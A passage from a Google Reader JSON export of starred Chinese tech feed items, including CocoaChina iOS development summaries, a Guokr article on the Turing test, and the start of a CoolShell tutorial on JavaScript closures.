href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"background-color:#efefef;text-align:center;padding:0px;font-size:11px;border:solid 1px #ccc\"><b>感谢<a href=\"http://42qu.com/\">42qu.com</a>为本站提供<a href=\"http://vps.42qu.com/\">VPS</a></b></div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"将vim变得简单:如何在vim中得到你最喜爱的IDE特性\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F894.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7166.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">将vim变得简单:如何在vim中得到你最喜爱的IDE特性</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"简明 Vim 练级攻略\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F5426.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7166.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/09/20/32305122.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">简明 Vim 练级攻略</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Vim的分屏功能\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1679.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7166.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437695.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Vim的分屏功能</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"编译vim解决中文支持\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1432.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7166.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">编译vim解决中文支持</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Vim命令速查卡\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F150.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7166.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/07/19/18062655.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Vim命令速查卡</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2010年10月12日 -- <a href=\"http://coolshell.cn/articles/3125.html\" title=\"主流文本编辑器学习曲线\">主流文本编辑器学习曲线</a></li><li>2010年10月09日 -- <a href=\"http://coolshell.cn/articles/3083.html\" title=\"三个教程\">三个教程</a></li><li>2010年09月28日 -- <a href=\"http://coolshell.cn/articles/3013.html\" title=\"一些非常有意思的杂项资源\">一些非常有意思的杂项资源</a></li><li>2009年05月23日 -- <a href=\"http://coolshell.cn/articles/894.html\" title=\"将vim变得简单:如何在vim中得到你最喜爱的IDE特性\">将vim变得简单:如何在vim中得到你最喜爱的IDE特性</a></li><li>2011年09月20日 -- <a href=\"http://coolshell.cn/articles/5224.html\" title=\"一些文章和各种资源\">一些文章和各种资源</a></li><li>2011年09月16日 -- <a href=\"http://coolshell.cn/articles/5479.html\" title=\"给程序员的VIM速查卡\">给程序员的VIM速查卡</a></li><li>2011年09月07日 -- <a href=\"http://coolshell.cn/articles/5426.html\" title=\"简明 Vim 练级攻略\">简明 Vim 练级攻略</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1335331066964",
    "timestampUsec" : "1335331066964484",
    "id" : "tag:google.com,2005:reader/item/004a5b6d36aecd18",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "开发环境" ],
    "title" : "不需Developper认证的真机调试",
    "published" : 1335319817,
    "updated" : 1335319817,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/newbie/env/2012/0425/4191.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "真机测试需要开发人员交纳99美金，对于急于真机测试并没时间等待审核的朋友，这个小技巧或许很有用。 ... <br><b>文章分类</b>:开发环境<br><a href=\"http://www.cocoachina.com/newbie/env/2012/0425/4191.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4191\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/newbie/env/2012/0425/4191.html\">评论回复</a>"
    },
    "author" : "chenxi",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334843117118",
    "timestampUsec" : "1334843117118566",
    "id" : "tag:google.com,2005:reader/item/eaeb212cab5514fd",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "通过图灵测试",
    "published" : 1334843117,
    "updated" : 1334843117,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/155296/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<div><img src=\"http://img1.guokr.com/gkimage/9j/sn/cl/9jsncl.png\" alt=\"Bletchley 公园的阿兰•图灵塑像  (Jon Callas/Flickr)\"><p>Bletchley 公园的阿兰•图灵塑像  (Jon Callas/Flickr)</p></div>\n<p>图灵是20世纪最伟大的数学家之一。作为现代计算机概念的缔造者，他的密码破译工作在第二次世界大战中起到了决定性的作用。在那个创意无限的计算机黎明时代，图灵率先提出的测试，说来似乎很简单：如果一台计算机通过对话，能使人们认定它是人类，那么这台计算机便被认为是具有智能的。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/8s/4a/gm/8s4agm.png\" alt=\"图灵试验的标准模式：C使用问题来判断A或B是人类还是机械。对象为：一个具有正常思维的人（代号B）、一个是机器（代号A）。如果经过若干询问以后，C不能得出实质的区别来分辨A与B的不同，则此机器A通过图灵试验。\"><p>图灵试验的标准模式：C使用问题来判断A或B是人类还是机械。对象为：一个具有正常思维的人（代号B）、一个是机器（代号A）。如果经过若干询问以后，C不能得出实质的区别来分辨A与B的不同，则此机器A通过图灵试验。</p></div>\n<p>在现代社会，无论是GPS导航系统与Google搜索引擎，还是自动柜员机与苹果Siri，更遑论象棋大师深蓝（Deep Blue）和满腹经纶的沃森（Watson），人工智能无处不在。但是，迄今为止，没有一台计算机通过了图灵测试。虽然如此，在尝试通过图灵测试的漫漫征程上，模拟人类思维的愿望不断激励着我们。这一原动力，对计算机科学乃至认知科学的发展，产生了深远影响。</p>\n<p>而现在，我们有理由相信，一台内核代码已经写就的计算机，拥有通过图灵测试的能力。</p>\n<p>“两项革命性的信息技术进步，可能将重新给被闲置已久的图灵测试，带来新的任务，”法国国家科学研究中心的认知科学家罗伯特•弗兰茨（Robert French）在4月12日的《科学》杂志上撰文称，“第一步是准备数量巨大的原始数据：输入的内容包括视频资料和完备的声音环境信息，以及随意的谈话内容和关于各种各样事物的技术文档。第二步是能够整理、收集、处理这些丰富数据的复杂技术。”</p>\n<p>这有没有可能创造出相当于人类大脑的认知水平的神经连结网络？它能感知到我们所感知的吗？</p>\n<p>图灵第一次进行他的测试，是在一次聚会时。他巧妙的实验令人印象深刻：参加者努力让评判者相信他们的性别是伪装的（图灵本人由于他的同性恋取向受到了严酷的迫害）。那时候，这种创建等效于人类大脑认知方式的低水平神经网络的想法还不存在。然而，复制人类的思想似乎很有可能，相比之下似乎更简单。</p>\n<p>我们一般认为，人类的思维是逻辑性的，而计算机能够运行逻辑性的命令。因此，我们的大脑应该是可计算的。计算机科学家由此认为，二十年之内，或许不超过十年，我们就可以看到这样激动人心的事情：人们无法根据对话分辨出，对方是计算机还是人类。</p>\n<p>这个过分简约的构想，被证明是建立在错误的理论基础上的。认知过程要远比20世纪中叶的计算机科学家及心理学家所设想的复杂得多。并且令人沮丧的是，在运用逻辑学描述我们的思想过程时，科学家遇到了非常大的困难。并且我们越来越清楚：根据人类大脑所特有的，适应快速变化的外界环境、整合信息碎片等一系列特殊功能来看，模仿人类思维几乎是无法完成的任务。</p>\n<p>“对于现实中众多不确定性而言，符号逻辑本身过于脆弱，”斯坦福大学研究机器智能模拟的计算机科学家诺亚•古德曼（Noah Goodman)如是说。尽管如此，现在被我们认为已经失败的传统AI，技术上依旧颇具启发性。因为它们彻底改变了，我们对于人类大脑运作方式的看法。挫折过后，不断涌出的是许许多多极其重要的认知科学新观点。</p>\n<p>直到20世纪80年代中期，图灵测试一直都是被放弃闲置的探索领域（尽管今天,它衍生出了专为虚拟聊天机器人设置的年度Loebner奖，同时即时虚拟广告机器人在我们的日常生活中也益发普遍）</p>\n<iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.tudou.com/v/M25jdeYUjps/v.swf&amp;width=480&amp;height=400\" width=\"480\" height=\"400\"></iframe><p>（康奈尔大学创新机器实验室的两部虚拟谈话机器人正在进行非常有趣的唠嗑)</p>\n<p>与此同时衍生出的是现代认知科学和人工智能的两个主要研究方向：</p>\n<p>1.推算事件发生的概率，做出准确判断。（称为概率性）</p>\n<p>2.在与简单、微小的程序的互动过程中，得出复杂的行为模式。（称为连结性）</p>\n<p>和那些像深蓝（Deep Blue）（曾因击败国际象棋大师Garry Kasparov扬名)一样使用“蛮力”的电脑程序的计算特点不同，人们认为这些程序至少精确反映出了，人类思维中产生的某些特有现象。</p>\n<p>迄今为止，所谓“概率性”和“连结性”这两大人工智能研究新思路，指导开发出了一系列现实生活中被广泛使用的人工智能产品：自动驾驶汽车，Google搜索引擎，自动机器翻译，以及IBM开发的能巧妙回答任何刁钻古怪问题的Watson电脑。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/pl/h1/fj/plh1fj.png\" alt=\"IBM的Watson电脑击败Ken Jennings，他是Jeopardy! 节目的人类最高水平玩家。\"><p>IBM的Watson电脑击败Ken Jennings，他是Jeopardy! 节目的人类最高水平玩家。</p></div>\n<p>但是美中不足的是，它们在某些方面能力仍旧有限——“如果你说：‘Watson，给我做晚饭好不好，’或者‘Watson，写首十四行诗吧,’他会憋炸的。”古德曼这样说道。但是人们不断上涨的使用（或调戏，好吧）欲望使它们的性能得以飞快进步，数据库更详实。</p>\n<p>“你所说过的、听到的、写下的、或者是读到的每一个字，每一句话，以及每一个看到的场景，每一段经历的声音片段,一并同其他成百上千、甚至成千上万的人们的相关数据，都被录制下来并可随时调用。久而久之，甚至触觉以及嗅觉传感器也可以被接入以全面丰富我们这个充满图像和声音的数据库。”作为对MIT（麻省理工）研究员戴伯•罗伊（Deb Roy）的相关研究的延伸，弗兰茨在《科学》杂志上这样设想。戴伯曾经录制了9万小时的视频，内容是关于他襁褓中的儿子清醒状态下的认知发展过程。</p>\n<p>假定我们拥有可以编目、分析、串联和交叉全部海量信息的处理软件，以及备有上述数据库和分析系统的程序，应该完全能够使得一台计算机回答现今的AI们无法回答的棘手问题。这最终意味着通过图灵测试。</p>\n<p>密歇根大学的人工智能专家赛汀德•辛（Satinder Singh)对数据所显示的前景充满了信心：“大容量数据库终会造就一台极具灵活性的人工智能机器。”</p>\n<p>但这样来说，梳理所有曾经学习过的问题数据就显得重要了许多。计算机要懂得：什么更值得记住，什么更值得去预测。可是，如果你把一个孩子领进屋内，让他自由自在、随心所愿，不交给他任何任务，他为什么会自发地做他想做的事情呢？所有的这类问题都变得异常有趣。</p>\n<p>“为了变得更渊博，更灵活，更有能力，一个人必须要被动力和好奇心所驱使，从而提炼出重要的事情，”辛说：“这些对计算机来说，都是巨大的挑战。”</p>\n<p>“一架机器要通过图灵测试，一定要充满着人类的情感与欲望吗？。就像是弗兰肯斯坦（玛莉•雪莱（Marry Shelley）笔下的人造人），或者有生命的泥人（Golem希伯莱传说中用粘土、石头或青铜制成的无生命的巨人，注入魔力后可行动）一样吗？”墨西哥国立自治大学的计算机科学家卡洛斯•格申森（Carlos Gershenson)充满了疑问。但是这和更基本的问题一样，难以回答。</p>\n<p>“这做起来一定很困难，可是我们这样做的目的是什么？”他充满了疑问。</p>\n<div>\n<div><br></div>\n</div>\n<hr>\n<div>\n<div><br></div>\n</div>\n<div>\n<div>编译自wired网站： <strong>Artificial Intelligence Could Be on Brink of Passing Turing Test</strong></div>\n<div>作者： Brandon Keim</div>\n</div>\n</div>"
    },
    "author" : "Drink-Me",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203261063",
    "timestampUsec" : "1334203261063920",
    "id" : "tag:google.com,2005:reader/item/9baf9194a629322c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "基础知识" ],
    "title" : "使用 Xcode4 发布程序教程",
    "published" : 1334123724,
    "updated" : 1334123724,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/newbie/basic/2012/0411/4143.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "Xcode4于先前版本区别很大，这篇文章对产品发布过程中的设置细节做了详尽的阐述。 ... <br><b>文章分类</b>:基础知识<br><a href=\"http://www.cocoachina.com/newbie/basic/2012/0411/4143.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4143\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/newbie/basic/2012/0411/4143.html\">评论回复</a>"
    },
    "author" : "chenxi",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203254812",
    "timestampUsec" : "1334203254812089",
    "id" : "tag:google.com,2005:reader/item/27f36e58ba7b4111",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "电子文档" ],
    "title" : "[中文翻译版] Blocks编程要点",
    "published" : 1334129844,
    "updated" : 1334129844,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/downloads/ebook/2012/0411/4146.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "【老狼推荐】Blocks编程要点 原文：Blocks Programming Topics 链接：http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html#//apple_ref/doc/uid/TP40007502-CH1-SW1 PDF文档下载 ... <br><b>文章分类</b>:电子文档<br><a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4146.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4146\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4146.html\">评论回复</a>"
    },
    "author" : "alienblue",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203253505",
    "timestampUsec" : "1334203253505134",
    "id" : "tag:google.com,2005:reader/item/3a1de008f7f297df",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "电子文档" ],
    "title" : "[中文翻译版] 核心动画编程指南",
    "published" : 1334130726,
    "updated" : 1334130726,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/downloads/ebook/2012/0411/4147.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "原文：Core Animation Programming Guide 链接：http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreAnimation_guide/Introduction/Introduction.html 目录 核心动画编程介绍 本文档结构 第一章 核心动画 ... <br><b>文章分类</b>:电子文档<br><a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4147.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4147\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4147.html\">评论回复</a>"
    },
    "author" : "alienblue",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203252020",
    "timestampUsec" : "1334203252020831",
    "id" : "tag:google.com,2005:reader/item/d0dbe8bb1c0dc0d4",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "电子文档" ],
    "title" : "[中文翻译版] Instruments 用户指南",
    "published" : 1334131266,
    "updated" : 1334131266,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/downloads/ebook/2012/0411/4148.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "原文：Core Animation Programming Guide 链接：http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreAnimation_guide/Introduction/Introduction.html 目录 INSTRUMENTS用户指南介绍 本文档组织结构 第一章 ... <br><b>文章分类</b>:电子文档<br><a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4148.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4148\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4148.html\">评论回复</a>"
    },
    "author" : "alienblue",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203250671",
    "timestampUsec" : "1334203250671079",
    "id" : "tag:google.com,2005:reader/item/1da4cb99da2824b8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "电子文档" ],
    "title" : "[中文翻译版] 本地和推送通知编程指南",
    "published" : 1334131484,
    "updated" : 1334131484,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/downloads/ebook/2012/0411/4149.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "原文：Local and Push Notification Programming Guide 链接：http://developer.apple.com/library/mac/#documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/Introduction/Introduction.html#//apple_ref/doc/uid/TP40008194-CH1-SW1 目 ... <br><b>文章分类</b>:电子文档<br><a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4149.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4149\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4149.html\">评论回复</a>"
    },
    "author" : "alienblue",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1334203249054",
    "timestampUsec" : "1334203249054336",
    "id" : "tag:google.com,2005:reader/item/0c69cc762a2ede29",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "电子文档" ],
    "title" : "[中文翻译版] 多线程编程指南",
    "published" : 1334132835,
    "updated" : 1334132835,
    "alternate" : [ {
      "href" : "http://www.cocoachina.com/downloads/ebook/2012/0411/4150.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "原文：Threading Programming Guide 链接：http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Multithreading/Introduction/Introduction.html#//apple_ref/doc/uid/10000057i-CH1-SW1 目录 多线程编程指南 简介 本文 ... <br><b>文章分类</b>:电子文档<br><a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4150.html\">阅读全文</a> | <a href=\"http://www.cocoachina.com/plus/recommend.php?aid=4150\">邮件推荐</a> | <a href=\"http://www.cocoachina.com/downloads/ebook/2012/0411/4150.html\">评论回复</a>"
    },
    "author" : "alienblue",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cocoachina.com/cms/rss.php",
      "title" : "CocoaChina 苹果开发中文站 - 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区- 最热的iPhone开发社区 最热的苹果开发社区 最热的iPad开发社区",
      "htmlUrl" : "http://www.cocoachina.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1331305847020",
    "timestampUsec" : "1331305847020228",
    "id" : "tag:google.com,2005:reader/item/1c3dd61c8e6aa64a",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Web开发", "编程语言", "ECMAScript", "Javascript", "OOP" ],
    "title" : "理解Javascript的闭包",
    "published" : 1331080243,
    "updated" : 1331080243,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/6731.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>【<span style=\"color:#cc0000\">感谢 Neo 投递本文 – 微博帐号：<a title=\"_锟_\" href=\"http://weibo.com/gandalfthegrey\">_锟_</a> </span>】</p>\n<p><strong>前言：还是一篇入门文章。</strong>Javascript中有几个非常重要的语言特性——对象、原型继承、闭包。其中闭包对于那些使用传统静态语言C/C++的程序员来说是一个新的语言特性。本文将以例子入手来介绍Javascript闭包的语言特性，并结合一点ECMAScript语言规范来使读者可以更深入的理解闭包。</p>\n<p>注：<strong>本文是入门文章，例子素材整理于网络<strong>，如果你是高手，欢迎针对文章提出技术性建议和意见。本文讨论的是Javascript，不想做语言对比，如果您对Javascript天生不适，请自行绕道。</strong></strong></p>\n<h4><strong><span style=\"color:#008000\">什么是闭包</span></strong></h4>\n<p>闭包是什么?闭包是Closure，这是静态语言所不具有的一个新特性。但是闭包也不是什么复杂到不可理解的东西，简而言之，闭包就是：<strong></strong></p>\n<ul>\n<li><strong>闭包就是函数的局部变量集合，只是这些局部变量在函数返回后会继续存在。</strong></li>\n<li><strong>闭包就是就是函数的“堆栈”在函数返回后并不释放，我们也可以理解为这些函数堆栈并不在栈上分配而是在堆上分配</strong></li>\n<li><strong>当在一个函数内定义另外一个函数就会产生闭包</strong></li>\n</ul>\n<p>上面的第二定义是第一个补充说明，抽取第一个定义的主谓宾——闭包是<strong>函数的‘局部变量’集合</strong>。只是这个局部变量是可以在函数返回后被访问。（这个不是官方定义，但是这个定义应该更有利于你理解闭包）</p>\n<p>做为局部变量都可以被函数内的代码访问，这个和静态语言是没有差别。闭包的差别在于局部变变量可以在函数执行结束后仍然被函数外的代码访问。这意味着函数必须返回一个指向闭包的“引用”，或将这个”引用”赋值给某个外部变量，才能保证闭包中局部变量被外部代码访问。当然包含这个引用的实体应该是一个对象，因为在Javascript中除了基本类型剩下的就都是对象了。可惜的是，ECMAScript并没有提供相关的成员和方法来访问闭包中的局部变量。但是在ECMAScript中，函数对象中定义的<strong>内部函数(inner function)</strong>是可以直接访问外部函数的局部变量，通过这种机制，我们就可以以如下的方式完成对闭包的访问了。</p>\n<p><span></span></p>\n<pre>\nfunction greeting(name) {\n    var text = &#39;Hello &#39; + name; // local variable\n    // 每次调用时，产生闭包，并返回内部函数对象给调用者\n    return function() { alert(text); }\n}\nvar sayHello=greeting(&quot;Closure&quot;);\nsayHello()  // 通过闭包访问到了局部变量text\n</pre>\n<p>上述代码的执行结果是：Hello Closure，因为sayHello()函数在greeting函数执行完毕后，仍然可以访问到了定义在其之内的局部变量text。</p>\n<p>好了，这个就是传说中闭包的效果，闭包在Javascript中有多种应用场景和模式，比如Singleton，Power Constructor等这些Javascript模式都离不开对闭包的使用。</p>\n<h4><strong><span style=\"color:#008000\">ECMAScript闭包模型</span></strong></h4>\n<p>ECMAScript到底是如何实现闭包的呢？想深入了解的亲们可以获取<a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf\">ECMAScript 规范</a>进行研究，我这里也只做一个简单的讲解，内容也是来自于网络。</p>\n<p>在ECMAscript的脚本的函数运行时，每个函数关联都有一个执行上下文场景(Execution Context) ，这个执行上下文场景中包含三个部分</p>\n<ul>\n<li>文法环境（The LexicalEnvironment）</li>\n<li>变量环境（The VariableEnvironment）</li>\n<li>this绑定</li>\n</ul>\n<p>其中第三点this绑定与闭包无关，不在本文中讨论。文法环境中用于解析函数执行过程使用到的变量标识符。我们可以将文法环境想象成一个对象，该对象包含了两个重要组件，环境记录(Enviroment Recode)，和外部引用(指针)。环境记录包含包含了函数内部声明的局部变量和参数变量，外部引用指向了外部函数对象的上下文执行场景。全局的上下文场景中此引用值为NULL。这样的数据结构就构成了一个单向的链表，每个引用都指向外层的上下文场景。</p>\n<p>例如上面我们例子的闭包模型应该是这样，sayHello函数在最下层，上层是函数greeting，最外层是全局场景。如下图：<br>\n<img src=\"http://coolshell.cn/wp-content/uploads/2012/03/closure.png\" alt=\"\" width=\"658\" height=\"478\"><br>\n因此当sayHello被调用的时候，sayHello会通过上下文场景找到局部变量text的值，因此在屏幕的对话框中显示出”Hello Closure”<br>\n变量环境(The VariableEnvironment)和文法环境的作用基本相似，具体的区别请参看ECMAScript的规范文档。</p>\n<h4><strong><span style=\"color:#008000\">闭包的样列</span></strong></h4>\n<p>前面的我大致了解了Javascript闭包是什么，闭包在Javascript是怎么实现的。下面我们通过针对一些例子来帮助大家更加深入的理解闭包，下面共有5个样例，例子来自于<a 